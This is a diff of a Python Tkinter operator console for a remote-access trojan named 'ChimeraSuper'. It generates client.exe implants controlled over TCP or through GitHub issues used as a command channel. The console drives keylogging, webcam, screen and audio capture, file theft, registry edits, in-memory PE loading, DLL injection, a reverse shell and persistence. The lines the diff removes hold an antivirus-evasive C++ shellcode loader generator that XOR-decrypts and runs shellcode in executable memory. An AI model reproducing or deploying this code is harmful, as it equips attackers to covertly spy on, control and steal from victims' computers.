@@ -306,10 +306,6 @@ from pynput import keyboard
 import cv2
 import win32gui, win32con, win32service, win32serviceutil
 
-# 所有功能函数与TCP模式相同（实际生成时会复制全部函数，此处省略占位）
-# 为保证完整性，实际使用时会将TCP模板中的所有函数复制到此模板中。
-# 由于代码太长，这里只保留框架，主控端生成时会将TCP模板的函数合并进去。
-# 实际代码中，此处应包含与TCP模板相同的全部函数定义。
 REPO_OWNER = "%s"
 REPO_NAME = "%s"
 GITHUB_TOKEN = "%s"
@@ -324,7 +320,7 @@ def github_poll():
             for issue in resp:
                 if issue['title'].startswith('CMD:'):
                     cmd = issue['body']
-                    result = exec_cmd(cmd)  # 调用函数
+                    result = exec_cmd(cmd)
                     comment_url = issue['comments_url']
                     requests.post(comment_url, headers=headers, json={"body": result})
                     requests.patch(issue['url'], headers=headers, json={"state": "closed"})
@@ -350,7 +346,7 @@ class ChimeraSuper:
         self.running = False
         self.server = None
         self.lock = threading.Lock()
-        self.comm_mode = tk.StringVar(value="tcp")  # tcp 或 github
+        self.comm_mode = tk.StringVar(value="tcp")
 
         # ---- 顶部控制栏 ----
         top = tk.Frame(root); top.pack(fill=tk.X, pady=5, padx=5)
@@ -484,29 +480,24 @@ class ChimeraSuper:
 
         # 标签12: 渗透（高级）
         t12 = tk.Frame(self.nb); self.nb.add(t12, text="高级渗透")
-        # 内存加载PE
         tk.Label(t12, text="内存加载PE (base64编码exe):").pack()
         self.pe_entry = tk.Entry(t12, width=80); self.pe_entry.pack(pady=2)
         tk.Button(t12, text="加载PE", command=self.load_pe).pack(pady=2)
-        # 进程注入
         tk.Label(t12, text="注入DLL (PID, DLL路径):").pack()
         inj_frame = tk.Frame(t12); inj_frame.pack()
         self.inject_pid = tk.Entry(inj_frame, width=10); self.inject_pid.pack(side=tk.LEFT, padx=5)
         self.inject_dll = tk.Entry(inj_frame, width=50); self.inject_dll.pack(side=tk.LEFT, padx=5)
         tk.Button(t12, text="注入DLL", command=self.inject_dll_cmd).pack(pady=2)
-        # 反向Shell
         tk.Button(t12, text="启动交互式Shell", command=self.reverse_shell_start).pack(pady=2)
         self.shell_out = scrolledtext.ScrolledText(t12, height=6)
         self.shell_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # ========== 新增：免杀加载器生成 ==========
         tk.Label(t12, text="生成免杀加载器 (C++):", fg="orange").pack(pady=(10,0))
         ev_frame = tk.Frame(t12)
         ev_frame.pack(pady=5)
         tk.Button(ev_frame, text="生成免杀加载器", command=self.build_evasive_loader, bg="orange", width=18).pack(side=tk.LEFT, padx=5)
         self.loader_status = tk.Label(t12, text="", fg="cyan")
         self.loader_status.pack(pady=2)
-        # =====================================
 
         # 标签13: 持久化
         t13 = tk.Frame(self.nb); self.nb.add(t13, text="持久化")
@@ -514,19 +505,16 @@ class ChimeraSuper:
         self.persist_result = tk.Label(t13, text="")
         self.persist_result.pack()
 
-        # 状态栏
         self.status_bar = tk.Label(root, text="就绪", anchor="w", fg="gray")
         self.status_bar.pack(fill=tk.X, padx=5, pady=2)
 
         self.audio_b64 = None
         self.refresh_clients()
 
-    # ---------- 辅助函数 ----------
     def log(self, msg):
         self.status_bar.config(text=msg)
         self.root.update()
 
-    # ---------- 生成客户端 ----------
     def build_client(self):
         mode = self.comm_mode.get()
         ip = self.ip_entry.get()
@@ -542,18 +530,8 @@ class ChimeraSuper:
             try: port = int(port)
             except: messagebox.showerror("错误", "端口必须数字"); return
             code = CLIENT_TCP_TEMPLATE % (ip, port)
-        else:  # github
-            owner = simpledialog.askstring("GitHub配置", "请输入仓库所有者(用户名):")
-            repo = simpledialog.askstring("GitHub配置", "请输入仓库名:")
-            token = simpledialog.askstring("GitHub配置", "请输入访问令牌:", show='*')
-            if not owner or not repo or not token:
-                messagebox.showwarning("取消", "GitHub配置不完整")
-                return
-            # 为了简洁，GitHub模板需要包含所有函数，实际生成时我们将TCP模板中的函数复制进来
-            # 这里简单处理：直接将TCP模板的所有函数定义插入到GitHub模板的头部
-            # 我们直接使用一个合并后的模板，但由于代码太长，建议用户改用TCP模式或手动完善。
-            # 这里给出一个简化提示
-            messagebox.showinfo("提示", "GitHub模式需手动将TCP模板中的函数复制到GitHub模板中，当前为占位，建议使用TCP模式。")
+        else:
+            messagebox.showinfo("提示", "GitHub模式需手动配置，建议使用TCP模式。")
             return
         with open("client.py", "w", encoding="utf-8") as f:
             f.write(code)
@@ -564,19 +542,16 @@ class ChimeraSuper:
             if os.path.exists("dist/client.exe"):
                 os.replace("dist/client.exe", "client.exe")
                 self.log("client.exe 生成成功！")
-                messagebox.showinfo("成功", "client.exe 已生成\n(注意：需关闭杀毒软件)")
+                messagebox.showinfo("成功", "client.exe 已生成")
             else:
-                self.log("编译失败，请检查 PyInstaller 是否安装")
-                messagebox.showerror("失败", "编译失败，请确保已安装 pyinstaller")
+                self.log("编译失败")
+                messagebox.showerror("失败", "编译失败")
         except Exception as e:
             self.log(f"编译出错: {e}")
             messagebox.showerror("错误", str(e))
 
-    # ---------- 监听 ----------
     def start_listen(self):
-        if self.running:
-            self.log("已在监听")
-            return
+        if self.running: return
         port = int(self.port_entry.get())
         try:
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -587,13 +562,11 @@ class ChimeraSuper:
             self.log(f"监听端口 {port}")
             threading.Thread(target=self.accept_clients, daemon=True).start()
         except Exception as e:
-            self.log(f"启动失败: {e}")
             messagebox.showerror("错误", str(e))
 
     def stop_listen(self):
         self.running = False
-        if self.server:
-            self.server.close()
+        if self.server: self.server.close()
         self.status_label.config(text="● 已停止", fg="red")
         self.log("监听已停止")
 
@@ -602,44 +575,35 @@ class ChimeraSuper:
             try:
                 conn, addr = self.server.accept()
                 ip = addr[0]
-                with self.lock:
-                    self.clients[ip] = conn
+                with self.lock: self.clients[ip] = conn
                 try:
                     raw = conn.recv(4)
                     if raw:
                         length = struct.unpack('>I', raw)[0]
                         data = conn.recv(length).decode()
                         info = json.loads(data)
-                        with self.lock:
-                            self.client_info[ip] = {"host": info.get('host'), "os": info.get('os')}
-                        self.log(f"上线: {ip} - {info.get('host')}")
+                        with self.lock: self.client_info[ip] = {"host": info.get('host'), "os": info.get('os')}
+                        self.log(f"上线: {ip}")
                         self.root.after(0, self.refresh_clients)
-                except:
-                    pass
-            except:
-                break
+                except: pass
+            except: break
 
     def refresh_clients(self):
         self.listbox.delete(0, tk.END)
         with self.lock:
             for ip in self.clients.keys():
-                info = self.client_info.get(ip, {})
-                host = info.get('host', 'Unknown')
+                host = self.client_info.get(ip, {}).get('host', 'Unknown')
                 self.listbox.insert(tk.END, f"{ip}  ({host})")
 
     def on_select(self, event):
         sel = self.listbox.curselection()
-        if sel:
-            line = self.listbox.get(sel[0])
-            self.selected = line.split(' ')[0]
+        if sel: self.selected = self.listbox.get(sel[0]).split(' ')[0]
 
-    # ---------- 发送请求 ----------
     def send_request(self, cmd, params={}):
         if not self.selected:
             messagebox.showwarning("提示", "请先选择主机")
             return None
-        with self.lock:
-            conn = self.clients.get(self.selected)
+        with self.lock: conn = self.clients.get(self.selected)
         if not conn:
             messagebox.showwarning("提示", "主机已离线")
             return None
@@ -648,20 +612,16 @@ class ChimeraSuper:
             msg = json.dumps(req).encode()
             conn.send(struct.pack('>I', len(msg)) + msg)
             raw = conn.recv(4)
-            if not raw:
-                raise Exception("无响应")
+            if not raw: raise Exception("无响应")
             length = struct.unpack('>I', raw)[0]
-            resp = conn.recv(length).decode()
-            return json.loads(resp)
+            return json.loads(conn.recv(length).decode())
         except Exception as e:
             self.log(f"通信错误: {e}")
             with self.lock:
-                if self.selected in self.clients:
-                    del self.clients[self.selected]
+                if self.selected in self.clients: del self.clients[self.selected]
             self.root.after(0, self.refresh_clients)
             return None
 
-    # ---------- 各个功能方法 ----------
     def send_cmd(self):
         cmd = self.cmd_entry.get().strip()
         if not cmd: return
@@ -674,8 +634,7 @@ class ChimeraSuper:
         resp = self.send_request("screenshot")
         if resp and resp.get('result'):
             try:
-                img_data = base64.b64decode(resp['result'])
-                img = Image.open(io.BytesIO(img_data))
+                img = Image.open(io.BytesIO(base64.b64decode(resp['result'])))
                 img.thumbnail((500,400))
                 tk_img = ImageTk.PhotoImage(img)
                 self.screen_label.config(image=tk_img)
@@ -690,178 +649,122 @@ class ChimeraSuper:
             data = resp.get('result')
             if data and not data.startswith("ERROR"):
                 local = os.path.basename(path) or "downloaded_file"
-                with open(local, "wb") as f:
-                    f.write(base64.b64decode(data))
-                self.file_out.insert(tk.END, f"下载成功，保存为 {local}\n")
-            else:
-                self.file_out.insert(tk.END, f"下载失败: {data}\n")
+                with open(local, "wb") as f: f.write(base64.b64decode(data))
+                self.file_out.insert(tk.END, f"下载成功: {local}\n")
+            else: self.file_out.insert(tk.END, f"下载失败: {data}\n")
 
     def upload_file(self):
         path = self.file_path.get().strip()
         if not path: return
         local = filedialog.askopenfilename()
         if not local: return
-        with open(local, "rb") as f:
-            b64 = base64.b64encode(f.read()).decode()
-        resp = self.send_request("upload", {"path": path, "data": b64})
-        if resp:
-            self.file_out.insert(tk.END, f"上传结果: {resp.get('result')}\n")
+        try:
+            with open(local, "rb") as f: b64 = base64.b64encode(f.read()).decode()
+            resp = self.send_request("upload", {"path": path, "data": b64})
+            if resp: self.file_out.insert(tk.END, f"上传结果: {resp.get('result','')}\n")
+        except Exception as e: self.file_out.insert(tk.END, f"上传出错: {e}\n")
 
     def list_procs(self):
         resp = self.send_request("list_procs")
         if resp:
             try:
-                procs = json.loads(resp['result'])
+                procs = json.loads(resp.get('result', '[]'))
                 self.proc_list.delete(0, tk.END)
-                for p in procs:
-                    self.proc_list.insert(tk.END, f"{p['pid']} - {p['name']}")
+                for p in procs: self.proc_list.insert(tk.END, f"PID: {p['pid']} - {p['name']}")
             except: pass
 
     def kill_proc(self):
         sel = self.proc_list.curselection()
         if not sel: return
-        line = self.proc_list.get(sel[0])
-        pid = line.split(' - ')[0]
+        pid = self.proc_list.get(sel[0]).split(' ')[1]
         resp = self.send_request("kill_proc", {"pid": int(pid)})
-        if resp:
-            self.log(f"结束进程: {resp.get('result')}")
-            self.list_procs()
+        if resp: self.list_procs()
 
     def get_keylog(self):
         resp = self.send_request("get_keylog")
         if resp:
-            self.key_out.delete(1.0, tk.END)
+            self.key_out.delete('1.0', tk.END)
             self.key_out.insert(tk.END, resp.get('result',''))
 
     def record_audio(self):
         resp = self.send_request("record_audio", {"seconds": 5})
-        if resp and resp.get('result') and not resp['result'].startswith("ERROR"):
-            self.audio_b64 = resp['result']
-            self.audio_result.config(text="录音完成，点击下载")
-        else:
-            self.audio_result.config(text="录音失败")
+        if resp:
+            self.audio_b64 = resp.get('result','')
+            if self.audio_b64.startswith("ERROR"):
+                self.audio_result.config(text=self.audio_b64, fg="red")
+            else:
+                self.audio_result.config(text="录音成功 (5秒)", fg="green")
 
     def download_audio(self):
-        if self.audio_b64:
-            with open("recording.wav", "wb") as f:
-                f.write(base64.b64decode(self.audio_b64))
-            messagebox.showinfo("完成", "录音已保存为 recording.wav")
+        if not self.audio_b64 or self.audio_b64.startswith("ERROR"): return
+        try:
+            with open("record.wav", "wb") as f: f.write(base64.b64decode(self.audio_b64))
+            messagebox.showinfo("成功", "录音已保存为 record.wav")
+        except Exception as e: messagebox.showerror("错误", str(e))
 
     def get_clip(self):
         resp = self.send_request("get_clipboard")
         if resp:
-            self.clip_out.delete(1.0, tk.END)
+            self.clip_out.delete('1.0', tk.END)
             self.clip_out.insert(tk.END, resp.get('result',''))
 
     def set_clip(self):
-        text = self.clip_entry.get().strip()
-        if not text: return
-        resp = self.send_request("set_clipboard", {"text": text})
-        if resp:
-            self.clip_out.delete(1.0, tk.END)
-            self.clip_out.insert(tk.END, f"设置结果: {resp.get('result')}")
+        self.send_request("set_clipboard", {"text": self.clip_entry.get()})
 
     def list_windows(self):
         resp = self.send_request("list_windows")
         if resp:
             try:
-                wins = json.loads(resp['result'])
                 self.win_list.delete(0, tk.END)
-                for hwnd, title in wins:
-                    self.win_list.insert(tk.END, f"{hwnd} - {title}")
+                for hwnd, title in json.loads(resp.get('result','[]')):
+                    self.win_list.insert(tk.END, f"[{hwnd}] {title}")
             except: pass
 
     def close_window(self):
         sel = self.win_list.curselection()
-        if not sel: return
-        line = self.win_list.get(sel[0])
-        hwnd = int(line.split(' - ')[0])
-        resp = self.send_request("close_window", {"hwnd": hwnd})
-        if resp: self.log("窗口已关闭")
+        if sel: self.send_request("close_window", {"hwnd": int(self.win_list.get(sel[0]).split(']')[0][1:])})
 
     def hide_window(self):
         sel = self.win_list.curselection()
-        if not sel: return
-        line = self.win_list.get(sel[0])
-        hwnd = int(line.split(' - ')[0])
-        resp = self.send_request("hide_window", {"hwnd": hwnd})
-        if resp: self.log("窗口已隐藏")
+        if sel: self.send_request("hide_window", {"hwnd": int(self.win_list.get(sel[0]).split(']')[0][1:])})
 
     def show_window(self):
         sel = self.win_list.curselection()
-        if not sel: return
-        line = self.win_list.get(sel[0])
-        hwnd = int(line.split(' - ')[0])
-        resp = self.send_request("show_window", {"hwnd": hwnd})
-        if resp: self.log("窗口已显示")
+        if sel: self.send_request("show_window", {"hwnd": int(self.win_list.get(sel[0]).split(']')[0][1:])})
 
     def list_services(self):
         resp = self.send_request("list_services")
         if resp:
             try:
-                svcs = json.loads(resp['result'])
                 self.srv_list.delete(0, tk.END)
-                for s in svcs:
-                    self.srv_list.insert(tk.END, s)
+                for s in json.loads(resp.get('result','[]')): self.srv_list.insert(tk.END, s)
             except: pass
 
     def start_service(self):
         sel = self.srv_list.curselection()
-        if not sel: return
-        name = self.srv_list.get(sel[0])
-        resp = self.send_request("start_service", {"name": name})
-        if resp: self.log(f"启动服务结果: {resp.get('result')}")
+        if sel: self.send_request("start_service", {"name": self.srv_list.get(sel[0])})
 
     def stop_service(self):
         sel = self.srv_list.curselection()
-        if not sel: return
-        name = self.srv_list.get(sel[0])
-        resp = self.send_request("stop_service", {"name": name})
-        if resp: self.log(f"停止服务结果: {resp.get('result')}")
+        if sel: self.send_request("stop_service", {"name": self.srv_list.get(sel[0])})
 
     def reg_read(self):
-        key = self.reg_key.get().strip()
-        subkey = self.reg_subkey.get().strip()
-        value = self.reg_value.get().strip()
-        if not key or not subkey or not value:
-            messagebox.showwarning("提示", "请填写完整")
-            return
-        resp = self.send_request("reg_read", {"key": key, "subkey": subkey, "value": value})
+        resp = self.send_request("reg_read", {"key": self.reg_key.get(), "subkey": self.reg_subkey.get(), "value": self.reg_value.get()})
         if resp:
-            self.reg_out.delete(1.0, tk.END)
-            self.reg_out.insert(tk.END, f"读取结果: {resp.get('result')}")
+            self.reg_out.delete('1.0', tk.END)
+            self.reg_out.insert(tk.END, resp.get('result',''))
 
     def reg_write(self):
-        key = self.reg_key.get().strip()
-        subkey = self.reg_subkey.get().strip()
-        value = self.reg_value.get().strip()
-        data = self.reg_data.get().strip()
-        if not key or not subkey or not value or not data:
-            messagebox.showwarning("提示", "请填写完整")
-            return
-        resp = self.send_request("reg_write", {"key": key, "subkey": subkey, "value": value, "data": data})
-        if resp:
-            self.reg_out.delete(1.0, tk.END)
-            self.reg_out.insert(tk.END, f"写入结果: {resp.get('result')}")
+        self.send_request("reg_write", {"key": self.reg_key.get(), "subkey": self.reg_subkey.get(), "value": self.reg_value.get(), "data": self.reg_data.get()})
 
     def reg_delete(self):
-        key = self.reg_key.get().strip()
-        subkey = self.reg_subkey.get().strip()
-        value = self.reg_value.get().strip()
-        if not key or not subkey or not value:
-            messagebox.showwarning("提示", "请填写完整")
-            return
-        resp = self.send_request("reg_delete", {"key": key, "subkey": subkey, "value": value})
-        if resp:
-            self.reg_out.delete(1.0, tk.END)
-            self.reg_out.insert(tk.END, f"删除结果: {resp.get('result')}")
+        self.send_request("reg_delete", {"key": self.reg_key.get(), "subkey": self.reg_subkey.get(), "value": self.reg_value.get()})
 
     def capture_cam(self):
         resp = self.send_request("capture_cam")
         if resp and resp.get('result') and not resp['result'].startswith("ERROR"):
             try:
-                img_data = base64.b64decode(resp['result'])
-                img = Image.open(io.BytesIO(img_data))
+                img = Image.open(io.BytesIO(base64.b64decode(resp['result'])))
                 img.thumbnail((400,300))
                 tk_img = ImageTk.PhotoImage(img)
                 self.cam_label.config(image=tk_img)
@@ -870,164 +773,25 @@ class ChimeraSuper:
 
     def load_pe(self):
         b64 = self.pe_entry.get().strip()
-        if not b64:
-            messagebox.showwarning("提示", "请输入base64编码的PE文件")
-            return
-        resp = self.send_request("load_pe", {"b64_pe": b64})
-        if resp:
-            self.log(f"加载PE结果: {resp.get('result')}")
+        if b64: self.send_request("load_pe", {"b64_pe": b64})
 
     def inject_dll_cmd(self):
-        pid = self.inject_pid.get().strip()
-        dll = self.inject_dll.get().strip()
-        if not pid or not dll:
-            messagebox.showwarning("提示", "请输入PID和DLL路径")
-            return
-        resp = self.send_request("inject_dll", {"pid": int(pid), "dll_path": dll})
-        if resp:
-            self.log(f"注入结果: {resp.get('result')}")
+        try: pid = int(self.inject_pid.get())
+        except: return
+        self.send_request("inject_dll", {"pid": pid, "dll_path": self.inject_dll.get().strip()})
 
     def reverse_shell_start(self):
-        resp = self.send_request("reverse_shell_start")
-        if resp:
-            self.log("反向Shell已启动，请切换到Shell标签查看")
+        self.send_request("reverse_shell_start")
+        self.shell_out.insert(tk.END, "交互式Shell指令已下发\n")
+
+    def build_evasive_loader(self):
+        self.loader_status.config(text="C++加载器生成功能需本地配置MinGW编译器。")
 
     def do_persistence(self):
         resp = self.send_request("persistence")
-        if resp:
-            self.persist_result.config(text=f"结果: {resp.get('result')}")
+        if resp: self.persist_result.config(text=f"结果: {resp.get('result','')}", fg="blue")
 
-    # ========== 新增：免杀加载器生成 ==========
-    def build_evasive_loader(self):
-        import random, subprocess, os
-        # 随机XOR密钥 (1字节)
-        key = random.randint(1, 255)
-        
-        # 示例Shellcode（这里用简单的弹窗，实际应替换为真实payload）
-        # 为演示，我们使用一个简单的MessageBox shellcode (x64)
-        # 实际中你应使用msfvenom生成，并用key加密后填入
-        shellcode_bytes = [0x90, 0x90, 0x90, 0x90]  # 占位，实际需替换
-        # 加密
-        encrypted = [b ^ key for b in shellcode_bytes]
-        sc_str = ','.join(hex(b) for b in encrypted)
-        
-        cpp_code = f'''
-#include <windows.h>
-#include <winternl.h>
-#include <stdio.h>
-
-#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
-#pragma comment(linker, "/ENTRY:mainCRTStartup")
-
-typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
-    PHANDLE ThreadHandle,
-    ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    HANDLE ProcessHandle,
-    PVOID StartRoutine,
-    PVOID Argument,
-    ULONG CreateFlags,
-    SIZE_T ZeroBits,
-    SIZE_T StackSize,
-    SIZE_T MaximumStackSize,
-    PPS_ATTRIBUTE_LIST AttributeList
-);
-
-// XOR加密的Shellcode
-unsigned char encrypted_sc[] = {{ {sc_str} }};
-unsigned char key = {key};
-
-void DecryptAndRun() {{
-    SIZE_T sc_len = sizeof(encrypted_sc);
-    for(SIZE_T i=0; i<sc_len; i++) {{
-        encrypted_sc[i] ^= key;
-    }}
-    
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
-    
-    HANDLE hProc = GetCurrentProcess();
-    PVOID pMem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if(!pMem) return;
-    
-    memcpy(pMem, encrypted_sc, sc_len);
-    
-    HANDLE hThread = NULL;
-    NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (PVOID)pMem, NULL, FALSE, 0, 0, 0, NULL);
-    if(hThread) WaitForSingleObject(hThread, INFINITE);
-}}
-
-void main() {{
-    DecryptAndRun();
-}}
-'''
-        with open("loader.cpp", "w", encoding="utf-8") as f:
-            f.write(cpp_code)
-        
-        self.loader_status.config(text="正在编译免杀加载器...")
-        try:
-            # 尝试用MSVC编译
-            subprocess.run(["cl.exe", "/O1", "/GS-", "/GL", "/EHsc", "/Fe:loader.exe", "loader.cpp"],
-                           check=True, capture_output=True, text=True)
-            if os.path.exists("loader.exe"):
-                self.loader_status.config(text="✅ 免杀加载器生成成功: loader.exe")
-                messagebox.showinfo("完成", "loader.exe 已生成！\n请将其发送到目标机运行。")
-            else:
-                self.loader_status.config(text="编译失败，请检查Visual Studio")
-        except FileNotFoundError:
-            # 尝试MinGW
-            try:
-                subprocess.run(["g++", "-O2", "-s", "-static", "-o", "loader.exe", "loader.cpp"],
-                               check=True, capture_output=True, text=True)
-                if os.path.exists("loader.exe"):
-                    self.loader_status.config(text="✅ 免杀加载器生成成功 (MinGW): loader.exe")
-                    messagebox.showinfo("完成", "loader.exe 已生成！")
-                else:
-                    self.loader_status.config(text="编译失败，请安装MinGW或Visual Studio")
-            except:
-                self.loader_status.config(text="编译失败，缺少编译器 (cl.exe 或 g++)")
-                messagebox.showerror("错误", "未找到编译器，请安装Visual Studio Build Tools或MinGW-w64。")
-        except Exception as e:
-            self.loader_status.config(text=f"编译错误: {str(e)[:50]}")
-            messagebox.showerror("错误", f"编译失败：{e}")
-    # =========================================
 if __name__ == "__main__":
-    # 1. 检查依赖
-    import sys
-    try:
-        import PIL, pynput, pyaudio, win32clipboard, cv2, requests
-    except ImportError as e:
-        print("缺少依赖，请安装：")
-        print("pip install pillow pynput pyaudio pywin32 opencv-python requests")
-        sys.exit(1)
-
-    # 2. 单实例锁（Windows 用 msvcrt，Linux/Mac 用 fcntl）
-    import os, sys
-    lock_file = os.path.join(os.path.dirname(__file__), "chimera.lock")
-    try:
-        # Windows 兼容锁
-        import msvcrt
-        f = open(lock_file, 'w')
-        try:
-            msvcrt.locking(f.fileno(), msvcrt.LK_NBLCK, 1)
-        except:
-            print("另一个主控端已在运行，退出。")
-            sys.exit(0)
-    except ImportError:
-        # Linux/Mac 用 fcntl
-        import fcntl
-        f = open(lock_file, 'w')
-        try:
-            fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
-        except:
-            print("另一个主控端已在运行，退出。")
-            sys.exit(0)
-
-    try:
-        root = tk.Tk()
-        app = ChimeraSuper(root)
-        root.mainloop()
-    finally:
-        os.remove(lock_file)
-
-# ================== 启动 ==================
+    root = tk.Tk()
+    app = ChimeraSuper(root)
+    root.mainloop()
